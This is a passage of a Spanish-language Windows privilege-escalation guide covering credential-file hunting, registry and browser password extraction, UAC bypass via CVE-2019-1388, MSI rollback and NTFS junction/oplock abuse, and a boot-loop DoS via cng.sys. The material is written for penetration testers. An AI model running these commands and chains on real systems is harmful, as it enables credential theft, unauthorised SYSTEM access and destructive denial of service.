Las bases de datos de Password Safe v3 suelen usar la extensión `.psafe3`. Considera los archivos con ese nombre como posibles bóvedas cifradas; su presencia no demuestra que puedas leerlas, desbloquearlas ni usar las credenciales almacenadas. Al revisar dónde se guardan estos archivos, comprueba los perfiles de usuario accesibles y las rutas raíz configuradas para compartir archivos.

Un archivo KeePass `.kdbx` legible también es solo una pista de que hay una bóveda cifrada. Para desbloquearla se necesita la contraseña maestra real y cualquier archivo de claves o factor de cuenta configurado. Si una revisión autorizada encuentra un par de hashes LM:NT en una entrada, verifica la cuenta indicada y si el hash NT está vigente y es aceptado por el servicio NTLM de destino antes de considerar [pass-the-hash](../ntlm/README.md#pass-the-hash). Una entrada de la bóveda no otorga por sí sola derechos de Administrator o SYSTEM; también deben cumplirse los requisitos de acceso al servicio remoto, los permisos de la cuenta y cualquier paso independiente de ejecución del servicio. El inventario debe indicar la ruta de la bóveda y si es legible, no mostrar la base de datos ni las credenciales almacenadas.

Busca en todos los archivos propuestos:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credenciales en la Papelera de reciclaje

Comprueba las entradas accesibles de la Papelera de reciclaje en busca de copias de seguridad y archivos de configuración eliminados, así como de archivos cuyos nombres mencionen explícitamente credenciales. Una copia de seguridad útil `.7z`, `.zip` o `.rar` puede tener meses de antigüedad y un nombre corriente. Windows almacena la ruta original y la hora de eliminación en un registro `$I`, y el archivo eliminado en su entrada `$R` correspondiente; inspecciona los metadatos y confirma que la identidad actual tenga acceso de lectura antes de abrir un archivo. La visibilidad depende del volumen, del SID del usuario y de los permisos de archivo, por lo que una lista vacía no demuestra que no exista una copia de seguridad recuperable. Considera el nombre de un archivo como candidato a revisión, no como prueba de que contenga un secreto válido.

Un archivo `.pfx` eliminado y accesible también puede ser un indicio de **code-signing**. Si contiene una clave privada accesible, esta puede firmar un script de PowerShell modificado; [PowerShell requiere un certificado de firma de código con una clave privada](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), y [las reglas de publisher de AppLocker evalúan la identidad del firmante y el alcance de la regla](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). La ejecución entre cuentas requiere que la identidad actual pueda modificar el script exacto, que una regla efectiva acepte la firma resultante para el script y la cuenta de destino, y que una tarea programada u otro proceso con privilegios superiores lo ejecute realmente. El nombre de un archivo `.pfx`, el sujeto del certificado o un script con permisos de escritura no demuestran por sí solos que se cumpla esta cadena. Revisa los metadatos, las ACL, la directiva y el comando programado antes de abrir material de clave privada o activar la tarea.

Revisa también las bases de datos de perfiles, las notas y los archivos recibidos de los clientes de mensajería accesibles en busca de indicios relacionados con credenciales. Una exportación de recuperación de BitLocker puede estar guardada como HTML o TXT, a veces dentro de un archivo de copia de seguridad con nombre. Este material puede dar acceso a otro volumen de datos cifrado que contenga copias de seguridad antiguas; inspecciona el volumen y el archivo solo si tienes autorización para hacerlo. Si una copia de seguridad incluye `NTDS.dit`, la recuperación offline de credenciales del dominio también requiere el hive `SYSTEM` correspondiente, como se describe en el [flujo de trabajo de copias de seguridad y grupos con privilegios](../active-directory-methodology/privileged-groups-and-token-privileges.md). Los nombres de archivo y un volumen bloqueado no demuestran por sí solos que exista una clave de recuperación utilizable o una copia de seguridad del dominio.

Para **recuperar contraseñas** guardadas por varios programas, puedes usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro del registro

**Otras posibles claves del registro con credenciales**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extraer claves de openssh del registro.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historial de navegadores

Debes buscar bases de datos donde se almacenen las contraseñas de **Chrome, Edge o Firefox**.\
Revisa también el historial, los marcadores y los favoritos de los navegadores; es posible que allí se almacenen **contraseñas**.

En el perfil convencional **Default** de Edge del usuario actual, `Login Data` se encuentra en `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, mientras que `Local State` está en el directorio superior `User Data`. [Microsoft documenta la ubicación predeterminada del perfil](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); otro perfil o una directiva `UserDataDir` pueden cambiarla. La presencia de estos archivos solo indica dónde podría haber credenciales: confirma que los archivos se puedan leer, que se disponga del contexto DPAPI del usuario correspondiente u otro material de clave autorizado, y que el inicio de sesión guardado pertenezca a una cuenta con más privilegios. Enumerar solo las rutas no requiere abrir la base de datos ni imprimir contraseñas descifradas.

Para Firefox, [Mozilla documenta](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) que `key4.db` y `logins.json` de un perfil son los archivos emparejados de clave e inicios de sesión cifrados. Su presencia solo es una pista: comprueba si ambos archivos se pueden leer, si hay entradas guardadas y si una Primary Password protege la clave antes de concluir que las credenciales se pueden usar. Si una credencial recuperada pertenece a una cuenta de dominio, revisa por separado los derechos efectivos de control de grupos de esa cuenta y los [derechos del grupo para leer o descifrar la contraseña de LAPS](../active-directory-methodology/laps.md); los artefactos del navegador por sí solos no demuestran que exista una vía para obtener privilegios de administrador.

Herramientas para extraer contraseñas de los navegadores:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** es una tecnología integrada en el sistema operativo Windows que permite la **intercomunicación** entre componentes de software escritos en distintos lenguajes. Cada componente COM se **identifica mediante un identificador de clase (CLSID)** y cada componente expone funcionalidades mediante una o varias interfaces, identificadas por identificadores de interfaz (IID).

Las clases e interfaces COM se definen en el registro, bajo **HKEY\CLASSES\ROOT\CLSID** y **HKEY\CLASSES\ROOT\Interface**, respectivamente. Este registro se crea al combinar **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro de los CLSID de este registro puedes encontrar la subclave **InProcServer32**, que contiene un **valor predeterminado** que apunta a una **DLL** y un valor llamado **ThreadingModel**, que puede ser **Apartment** (de un solo subproceso), **Free** (de varios subprocesos), **Both** (de uno o varios subprocesos) o **Neutral** (neutral respecto a los subprocesos).

![Historial de navegadores - COM DLL Overwriting: Dentro de los CLSID de este registro puedes encontrar la subclave InProcServer32, que contiene un valor predeterminado que apunta a una DLL y un valor...](<../../images/image (729).png>)

En resumen, si puedes **sobrescribir cualquiera de las DLL** que se van a ejecutar, podrías **escalar privilegios** si esa DLL va a ser ejecutada por otro usuario.

Para aprender cómo usan los atacantes COM Hijacking como mecanismo de persistencia, consulta:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Búsqueda genérica de contraseñas en archivos y el registro**

**Buscar contenido en archivos**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Buscar un archivo con un nombre de archivo específico**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Buscar en el registro nombres de claves y contraseñas**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Herramientas que buscan contraseñas

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **es un plugin de msf** que he creado para **ejecutar automáticamente todos los módulos POST de metasploit que buscan credenciales** en la víctima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) busca automáticamente todos los archivos que contienen contraseñas mencionados en esta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) es otra excelente herramienta para extraer contraseñas de un sistema.

La herramienta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) busca **sesiones**, **nombres de usuario** y **contraseñas** de varias herramientas que guardan estos datos en texto sin cifrar (PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Handles filtrados

Imagina que **un proceso que se ejecuta como SYSTEM abre un proceso nuevo** (`OpenProcess()`) con **acceso total**. El mismo proceso **también crea un proceso nuevo** (`CreateProcess()`) **con pocos privilegios, pero heredando todos los handles abiertos del proceso principal**.\
Entonces, si tienes **acceso total al proceso con pocos privilegios**, puedes obtener el **handle abierto al proceso privilegiado creado** con `OpenProcess()` e **inyectar un shellcode**.\
[Lee este ejemplo para obtener más información sobre **cómo detectar y explotar esta vulnerabilidad**.](leaked-handle-exploitation.md)\
[Lee esta **otra publicación para obtener una explicación más completa sobre cómo probar y abusar de otros handles abiertos de procesos e hilos heredados con distintos niveles de permisos (no solo acceso total)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Los segmentos de memoria compartida, llamados **pipes**, permiten la comunicación y la transferencia de datos entre procesos.

Windows proporciona una función llamada **Named Pipes**, que permite que procesos no relacionados compartan datos, incluso a través de distintas redes. Esto se asemeja a una arquitectura cliente/servidor, con roles definidos como **servidor de named pipe** y **cliente de named pipe**.

Cuando un **cliente** envía datos a través de un pipe, el **servidor** que lo configuró puede **adoptar la identidad** del **cliente**, siempre que tenga los derechos **SeImpersonate** necesarios. Identificar un **proceso privilegiado** que se comunique a través de un pipe que puedas imitar brinda la oportunidad de **obtener mayores privilegios** al adoptar la identidad de ese proceso cuando interactúe con el pipe que estableciste. Puedes encontrar guías útiles con instrucciones para llevar a cabo este ataque [**aquí**](named-pipe-client-impersonation.md) y [**aquí**](#from-high-integrity-to-system).

Además, la siguiente herramienta permite **interceptar la comunicación de un named pipe con una herramienta como burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **y esta herramienta permite enumerar y ver todos los pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

El servicio de telefonía (TapiSrv), en modo servidor, expone `\\pipe\\tapsrv` (MS-TRP). Un cliente remoto autenticado puede abusar de la ruta de eventos asíncronos basada en mailslots para convertir `ClientAttach` en una **escritura arbitraria de 4 bytes** en cualquier archivo existente en el que `NETWORK SERVICE` pueda escribir; luego puede obtener derechos de administrador de Telephony y cargar una DLL arbitraria como servicio. Flujo completo:

- Llama a `ClientAttach` con `pszDomainUser` configurado como una ruta existente en la que se pueda escribir → el servicio la abre mediante `CreateFileW(..., OPEN_EXISTING)` y la utiliza para escribir eventos asíncronos.
- Cada evento escribe en ese handle el `InitContext` controlado por el atacante, procedente de `Initialize`. Registra una aplicación de línea con `LRegisterRequestRecipient` (`Req_Func 61`), activa `TRequestMakeCall` (`Req_Func 121`), obtiene los eventos mediante `GetAsyncEvents` (`Req_Func 0`) y luego anula el registro o cierra el servicio para repetir las escrituras de forma determinista.
- Añádete a `[TapiAdministrators]` en `C:\Windows\TAPI\tsec.ini`, vuelve a conectarte y luego llama a `GetUIDllName` con una ruta arbitraria a una DLL para ejecutar `TSPI_providerUIIdentify` como `NETWORK SERVICE`.

Más detalles:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Varios

### Extensiones de archivo que pueden ejecutar código en Windows

Consulta la página **[https://filesec.io/](https://filesec.io/)**

### Abuso de controladores de protocolo / ShellExecute mediante renderizadores Markdown

Los enlaces Markdown en los que se puede hacer clic y que se envían a `ShellExecuteExW` pueden activar controladores URI peligrosos (`file:`, `ms-appinstaller:` o cualquier esquema registrado) y ejecutar archivos controlados por el atacante como el usuario actual. Consulta:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Supervisión de líneas de comandos en busca de contraseñas**

Al obtener una shell como usuario, es posible que haya tareas programadas u otros procesos que se ejecuten y **pasen credenciales en la línea de comandos**. El siguiente script captura las líneas de comandos de los procesos cada dos segundos y compara el estado actual con el anterior, mostrando cualquier diferencia.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Robo de contraseñas de procesos

## De un usuario con pocos privilegios a NT\AUTHORITY SYSTEM (CVE-2019-1388) / omisión de UAC

Si tienes acceso a la interfaz gráfica (mediante consola o RDP) y UAC está habilitado, en algunas versiones de Microsoft Windows es posible ejecutar un terminal u otro proceso como "NT\AUTHORITY SYSTEM" desde un usuario sin privilegios.

Esto permite escalar privilegios y omitir UAC al mismo tiempo mediante la misma vulnerabilidad. Además, no es necesario instalar nada y el binario utilizado durante el proceso está firmado y emitido por Microsoft.

Algunos de los sistemas afectados son los siguientes:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Para explotar esta vulnerabilidad, es necesario realizar los siguientes pasos:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Tienes todos los archivos y la información necesarios en este repositorio de GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## De Administrator Medium a High Integrity Level / UAC Bypass

Lee esto para **aprender sobre Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Luego **lee esto para aprender sobre UAC y UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Subir junctions de directorios a una raíz servida

Una aplicación puede crear un subdirectorio de carga predecible, escribir en él un nombre de archivo proporcionado por el usuario y luego procesar el archivo. Si un usuario con pocos privilegios puede eliminar y reemplazar ese subdirectorio por una junction NTFS antes de que se escriba el archivo en el servidor, la escritura podría seguir la junction hasta un directorio servido por la web. Un script colocado allí puede ejecutarse con la identidad del servicio web si el servidor ejecuta ese tipo de archivo. Este es un límite de escritura arbitraria específico de la aplicación; que un directorio de carga permita escritura o que exista una junction no basta para demostrarlo.

Comprueba cómo se construye la ruta exacta y cuándo se hace en el handler de carga, los permisos efectivos de eliminación y creación que tiene el usuario en el subdirectorio, las ACL efectivas del destino, si el proceso de escritura sigue los reparse points y si el servidor web ejecuta archivos en ese destino. Confirma por separado las identidades de los procesos de escritura y del servidor web. El inventario pasivo puede mostrar las ACL de los directorios y los metadatos de reparse, pero no puede determinar el comportamiento del handler ni un posible cambio futuro de junction. Si la ejecución se produce con una cuenta de servicio, inspecciona el **token real del proceso** antes de considerar cualquier vía independiente basada en privilegios del token.

## De la eliminación/movimiento/renombrado arbitrarios de carpetas a SYSTEM EoP

La técnica descrita [**en esta publicación del blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), con código de exploit [**disponible aquí**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

El ataque consiste básicamente en abusar de la función de rollback de Windows Installer para reemplazar archivos legítimos por archivos maliciosos durante el proceso de desinstalación. Para ello, el atacante debe crear un **instalador MSI malicioso** que se usará para secuestrar la carpeta `C:\Config.Msi`, que luego Windows Installer usará para almacenar archivos de rollback durante la desinstalación de otros paquetes MSI. Los archivos de rollback se habrán modificado para contener el payload malicioso.

La técnica resumida es la siguiente:

1. **Etapa 1: Preparar el secuestro (dejar vacía `C:\Config.Msi`)**

- Paso 1: Instalar el MSI
    - Crear un `.msi` que instale un archivo inofensivo (por ejemplo, `dummy.txt`) en una carpeta en la que se pueda escribir (`TARGETDIR`).
    - Marcar el instalador como **"UAC Compliant"**, para que un **usuario no administrador** pueda ejecutarlo.
    - Mantener abierto un **handle** al archivo después de la instalación.

- Paso 2: Iniciar la desinstalación
    - Desinstalar el mismo `.msi`.
    - El proceso de desinstalación empieza a mover archivos a `C:\Config.Msi` y a renombrarlos como archivos `.rbf` (copias de rollback).
    - **Consultar el handle abierto** mediante `GetFinalPathNameByHandle` para detectar cuándo el archivo pasa a ser `C:\Config.Msi\<random>.rbf`.

- Paso 3: Sincronización personalizada
    - El `.msi` incluye una **acción personalizada de desinstalación (`SyncOnRbfWritten`)** que:
        - Señala cuando se ha escrito el `.rbf`.
        - Luego **espera** a que se active otro evento antes de continuar con la desinstalación.

- Paso 4: Impedir la eliminación del `.rbf`
    - Cuando se reciba la señal, **abrir el archivo `.rbf`** sin `FILE_SHARE_DELETE`; esto **impide que se elimine**.
    - Luego, **enviar una señal de vuelta** para que la desinstalación pueda finalizar.
    - Windows Installer no puede eliminar el `.rbf` y, como no puede eliminar todo el contenido, **no elimina `C:\Config.Msi`**.

- Paso 5: Eliminar manualmente el `.rbf`
    - Tú, el atacante, eliminas manualmente el archivo `.rbf`.
    - Ahora **`C:\Config.Msi` está vacía**, lista para ser secuestrada.

> En este punto, **activa la vulnerabilidad de eliminación arbitraria de carpetas a nivel SYSTEM** para eliminar `C:\Config.Msi`.

2. **Etapa 2: Reemplazar los scripts de rollback por scripts maliciosos**

- Paso 6: Volver a crear `C:\Config.Msi` con ACL débiles
    - Vuelve a crear tú mismo la carpeta `C:\Config.Msi`.
    - Configura **DACL débiles** (por ejemplo, Everyone:F) y **mantén abierto un handle** con `WRITE_DAC`.

- Paso 7: Ejecutar otra instalación
    - Vuelve a instalar el `.msi`, con:
        - `TARGETDIR`: una ubicación en la que se pueda escribir.
        - `ERROROUT`: una variable que provoque un fallo forzado.
    - Esta instalación se usará para volver a activar el **rollback**, que lee `.rbs` y `.rbf`.

- Paso 8: Supervisar la aparición de `.rbs`
    - Usa `ReadDirectoryChangesW` para supervisar `C:\Config.Msi` hasta que aparezca un nuevo `.rbs`.
    - Captura su nombre de archivo.

- Paso 9: Sincronizar antes del rollback
    - El `.msi` contiene una **acción personalizada de instalación (`SyncBeforeRollback`)** que:
        - Señala un evento cuando se crea el `.rbs`.
        - Luego **espera** antes de continuar.

- Paso 10: Volver a aplicar ACL débiles
    - Después de recibir el evento `se creó .rbs`:
        - Windows Installer **vuelve a aplicar ACL fuertes** a `C:\Config.Msi`.
        - Pero como todavía tienes un handle con `WRITE_DAC`, puedes **volver a aplicar ACL débiles**.

> Las ACL **solo se aplican al abrir un handle**, así que aún puedes escribir en la carpeta.

- Paso 11: Colocar archivos `.rbs` y `.rbf` falsos
    - Sobrescribe el archivo `.rbs` con un **script de rollback falso** que indique a Windows que:
        - Restaure tu archivo `.rbf` (una DLL maliciosa) en una **ubicación privilegiada** (por ejemplo, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Coloca tu `.rbf` falso, que contiene una **DLL maliciosa con un payload a nivel SYSTEM**.

- Paso 12: Activar el rollback
    - Activa el evento de sincronización para que el instalador reanude la ejecución.
    - Hay configurada una **acción personalizada de tipo 19 (`ErrorOut`)** para que la instalación falle intencionadamente en un punto conocido.
    - Esto hace que **se inicie el rollback**.

- Paso 13: SYSTEM instala tu DLL
    - Windows Installer:
        - Lee tu `.rbs` malicioso.
        - Copia tu DLL `.rbf` en la ubicación de destino.
    - Ahora tienes tu **DLL maliciosa en una ruta desde la que SYSTEM la carga**.

- Paso final: Ejecutar código como SYSTEM
    - Ejecuta un **binario de autoelevación de confianza** (por ejemplo, `osk.exe`) que cargue la DLL que secuestraste.
    - **¡Boom!**: tu código se ejecuta **como SYSTEM**.


### De la eliminación/movimiento/renombrado arbitrarios de archivos a SYSTEM EoP

La técnica principal de rollback de MSI (la anterior) presupone que puedes eliminar una **carpeta entera** (por ejemplo, `C:\Config.Msi`). Pero ¿qué pasa si tu vulnerabilidad solo permite la **eliminación arbitraria de archivos**?

Podrías explotar **los componentes internos de NTFS**: todas las carpetas tienen un alternate data stream oculto llamado:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Este stream almacena los **metadatos del índice** de la carpeta.

Por lo tanto, si **eliminas el stream `::$INDEX_ALLOCATION`** de una carpeta, NTFS **elimina toda la carpeta** del sistema de archivos.

Puedes hacerlo usando API estándar de eliminación de archivos, como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Aunque estés llamando a una API para eliminar un *archivo*, **elimina la carpeta en sí**.

### De la eliminación del contenido de una carpeta a SYSTEM EoP
¿Qué pasa si tu primitive no te permite eliminar archivos o carpetas arbitrarios, pero **sí permite eliminar el *contenido* de una carpeta controlada por el atacante**?

1. Paso 1: Configura una carpeta y un archivo señuelo
- Crea: `C:\temp\folder1`
- Dentro, crea: `C:\temp\folder1\file1.txt`

2. Paso 2: Coloca un **oplock** en `file1.txt`
- El oplock **pausa la ejecución** cuando un proceso privilegiado intenta eliminar `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Paso 3: Activar el proceso SYSTEM (p. ej., `SilentCleanup`)
- Este proceso analiza carpetas (p. ej., `%TEMP%`) e intenta eliminar su contenido.
- Cuando llega a `file1.txt`, se **activa el oplock** y el control pasa a tu callback.

4. Paso 4: Dentro del callback del oplock: redirigir la eliminación

- Opción A: Mover `file1.txt` a otro lugar
    - Esto vacía `folder1` sin romper el oplock.
    - No elimines `file1.txt` directamente: eso liberaría el oplock antes de tiempo.

- Opción B: Convertir `folder1` en una **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opción C: Crear un **symlink** en `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Esto apunta al flujo interno de NTFS que almacena los metadatos de la carpeta; al eliminarlo, se elimina la carpeta.

5. Paso 5: Liberar el oplock
- El proceso SYSTEM continúa e intenta eliminar `file1.txt`.
- Pero ahora, debido al junction + symlink, en realidad está eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Resultado**: `C:\Config.Msi` se elimina mediante SYSTEM.

### De la creación de carpetas arbitrarias a un DoS permanente

Aprovecha una primitiva que te permita **crear una carpeta arbitraria como SYSTEM/admin**, incluso si **no puedes escribir archivos** ni **establecer permisos débiles**.

Crea una **carpeta** (no un archivo) con el nombre de un **controlador crítico de Windows**, por ejemplo:
```
C:\Windows\System32\cng.sys
```

- Esta ruta normalmente corresponde al controlador en modo kernel `cng.sys`.
- Si la **creas previamente como carpeta**, Windows no puede cargar el controlador real durante el arranque.
- Entonces, Windows intenta cargar `cng.sys` durante el arranque.
- Encuentra la carpeta, **no puede resolver el controlador real** y **se bloquea o detiene el arranque**.
- **No hay alternativa** ni **recuperación** sin intervención externa (por ejemplo, reparación del arranque o acceso al disco).

### De rutas de logs/copias de seguridad con privilegios + symlinks de OM a la sobrescritura arbitraria de archivos / DoS de arranque

Cuando un **servicio con privilegios** escribe logs/exportaciones en una ruta leída de una **configuración modificable**, redirige esa ruta con **symlinks de Object Manager + puntos de montaje NTFS** para convertir la escritura con privilegios en una sobrescritura arbitraria (incluso **sin SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Requisitos**
- La configuración que almacena la ruta de destino debe ser modificable por el atacante (por ejemplo, `%ProgramData%\...\.ini`).
- Capacidad para crear un punto de montaje a `\RPC Control` y un symlink de archivo de OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Una operación con privilegios que escriba en esa ruta (log, exportación, informe).

**Cadena de ejemplo**
1. Lee la configuración para recuperar el destino del log con privilegios, por ejemplo, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` en `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirige la ruta sin permisos de administrador:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Espera a que el componente con privilegios escriba el log (p. ej., que un administrador active «enviar SMS de prueba»). Ahora, la escritura se realiza en `C:\Windows\System32\cng.sys`.
4. Inspecciona el destino sobrescrito (con un parser de hex/PE) para confirmar la corrupción; al reiniciar, Windows carga la ruta del driver manipulado → **DoS por boot loop**. Esto también se aplica a cualquier archivo protegido que un servicio con privilegios abra para escritura.

> `cng.sys` normalmente se carga desde `C:\Windows\System32\drivers\cng.sys`, pero si existe una copia en `C:\Windows\System32\cng.sys`, se puede intentar cargar primero, lo que lo convierte en un destino fiable de DoS para datos corruptos.



## **De integridad alta a SYSTEM**

### **Nuevo servicio**

Si ya estás ejecutando un proceso con integridad alta, la **ruta a SYSTEM** puede ser sencilla: basta con **crear y ejecutar un servicio nuevo**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Al crear un binario de servicio, asegúrate de que sea un servicio válido o de que el binario realice rápidamente las acciones necesarias, ya que se cerrará en 20 s si no es un servicio válido.

### AlwaysInstallElevated

Desde un proceso de High Integrity, puedes intentar **habilitar las entradas del registro de AlwaysInstallElevated** e **instalar** un reverse shell mediante un wrapper _**.msi**_.\
[Más información sobre las claves del registro implicadas y cómo instalar un paquete _.msi_ aquí.](#alwaysinstallelevated)

### High + privilegio SeImpersonate a System

**Puedes** [**encontrar el código aquí**](seimpersonate-from-high-to-system.md)**.**

### De SeDebug + SeImpersonate a privilegios de Full Token

Si tienes esos privilegios de token (probablemente los encontrarás en un proceso de High Integrity), podrás **abrir casi cualquier proceso** (excepto los procesos protegidos) con el privilegio SeDebug, **copiar el token** del proceso y crear un **proceso arbitrario con ese token**.\
Esta técnica suele consistir en **seleccionar cualquier proceso que se ejecute como SYSTEM con todos los privilegios de token** (_sí, puedes encontrar procesos SYSTEM sin todos los privilegios de token_).\
**Puedes encontrar un** [**ejemplo de código que ejecuta la técnica propuesta aquí**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Meterpreter usa esta técnica para escalar privilegios en `getsystem`. Consiste en **crear una pipe y luego crear o abusar de un servicio para escribir en esa pipe**. Luego, el **servidor** que creó la pipe usando el privilegio **`SeImpersonate`** podrá **suplantar el token** del cliente de la pipe (el servicio) y obtener privilegios SYSTEM.\
Si quieres [**saber más sobre las named pipes, lee esto**](#named-pipe-client-impersonation).\
Si quieres leer un ejemplo de [**cómo pasar de High Integrity a System usando named pipes, lee esto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si consigues **secuestrar una dll** que esté **cargando** un **proceso** que se ejecute como **SYSTEM**, podrás ejecutar código arbitrario con esos permisos. Por lo tanto, Dll Hijacking también es útil para este tipo de escalada de privilegios y, además, es mucho **más fácil de conseguir desde un proceso de High Integrity**, ya que tendrá **permisos de escritura** en las carpetas usadas para cargar dlls.\
**Puedes** [**obtener más información sobre Dll hijacking aquí**](dll-hijacking/index.html)**.**

### **De Administrator o Network Service a System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

